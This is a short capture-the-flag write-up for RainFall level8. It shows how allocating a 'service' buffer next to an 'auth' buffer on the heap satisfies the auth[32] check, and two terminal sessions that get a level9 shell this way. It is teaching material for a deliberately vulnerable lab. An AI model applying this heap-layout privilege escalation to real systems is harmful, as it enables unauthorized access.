We can use four commands in this little game:
- `auth `, malloc `auth` global variable.
- `service`, malloc `service` gloabl varibale.
- `reset`, free `auth`.
- `login`, acces a shell if we managed to fufill the condition `auth[32] != 0`.

We can check the address of `auth` and `service` once allocated:
`0x804a008, 0x804a018`

They are separated by 16 padding bytes, meaning if we fill `service` is 16 bytes long we will fill `auth[32]`.
```shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ whoami
level9
$
```

We could also call two times `service` command to allocate a second 16 bytes padding buffer.
```shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
$
```
